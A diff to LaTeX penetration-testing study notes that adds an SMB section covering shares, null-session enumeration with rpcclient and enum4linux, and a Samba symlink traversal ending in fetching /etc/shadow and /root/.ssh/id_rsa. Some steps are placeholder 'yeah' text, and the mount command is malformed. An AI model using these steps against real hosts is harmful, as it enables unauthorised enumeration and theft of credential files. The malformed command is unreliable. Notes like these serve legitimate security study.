@@ -224,8 +224,8 @@ Attackers can register abandoned domain names or claim abandoned IP addresses of
 
 \begin{itemize}
     \item \textbf{Stateful and clear-text}: the commands, usernames, and passwords sent over FTP is visible to anyone sniffing traffic. \textbf{FTPS} implements certificates and fixes this issue.
-    \item \textbf{TCP Port 21}: sends commands and receiving status codes.
-    \item \textbf{TCP Port 20}: used for actual transfer of file data in "Active" mode.
+    \item \textbf{TCP 21}: sends commands and receiving status codes.
+    \item \textbf{TCP 20}: used for actual transfer of file data in "Active" mode.
 \end{itemize}
 
 \subsubsection*{FTP: Interaction}
@@ -245,6 +245,49 @@ Attackers can register abandoned domain names or claim abandoned IP addresses of
 \begin{enumerate}
     \item \texttt{nmap -sV --script ftp-anon <target>}: check for this vulnerability.
     \item \texttt{wget -m ftp://anonymous:anonymous@<target>}: mirrors entire server locally.
+\end{enumerate}
+
+\subsection*{Server Message Block (SMB)}
+
+Originally developed by IBM in the early 1980s as a simple file sharing tool, later heavily adopted and refined by Microsoft and evolved into the primary communication method for Windows-based environments.
+
+\begin{itemize}
+    \item \textbf{TCP 445}: modern standard for SMB over IP.
+    \item \textbf{UDP 137/138 \& TCP 139}: legacy ports used for NetBIOS communication.
+    \item Organized into \textbf{"shares"} - specific folders made available to the server.
+    \item Used for \textbf{resource sharing}, including sharing files, printers, and serial ports between computers on a network.
+    \item Provides IPC to "request" a service from another computer on the network.
+    \item Backbone of \textbf{Windows Active Directory}.
+\end{itemize}
+
+\subsubsection*{SMB: Interaction}
+
+\begin{enumerate}
+    \item \texttt{smbclient -L //<target\_IP>/ -U <username>}: shows all available shares.
+    \item \texttt{smbclient //<target\_IP>/<share\_name> -U <username>}: connect to a share.
+    \item \texttt{put <filename>}: uploading a file.
+    \item \texttt{sudo mount -t cifs //<target\_IP>/<share\_name> -U /mnt/smb -o}: mount as a drive.
+\end{enumerate}
+
+\subsubsection*{SMB: Null Sessions}
+
+\textbf{SMB null sessions} is an unauthenticated connection to a Windows SMB server that allows an attacker to query the system for information without any credentials (enabled when \texttt{RestrictAnonymous = 0} in the registry). It allows for enumeration of the network to provide enough information for password spraying, targeted phishing attacks, and sometimes even direct file access.
+
+\begin{enumerate}
+    \item \texttt{rpcclient -U "" -N <target>}: successful prompt indicates vulnerability.
+    \item \texttt{enumdomusers} or \texttt{querydispinfo}: inside \texttt{rpcclient} to enumerate account names.
+    \item \texttt{smbclient -L //<target> -N}: reveals hidden or administrative shares available for access.
+    \item \texttt{enum4linux -a <target>}: scrapes all available system and user data in one command.
+\end{enumerate}
+
+\subsubsection*{SMB: Symlink Traversal}
+
+\textbf{Symlink traversal} occurs when the Samba service is configured to follow "wide links" that point outside of the designated share path. Attackers with write access to a share can create symbolic links to root, effectively bypassing the share.
+
+\begin{enumerate}
+    \item \texttt{symlink / root\_portal}: point the share entry to the server's root directory.
+    \item \texttt{cd root\_portal}: yeah
+    \item \texttt{get /etc/shadow} or \texttt{/root/.ssh/id\_rsa}: yeah
 \end{enumerate}
 
 \end{document}
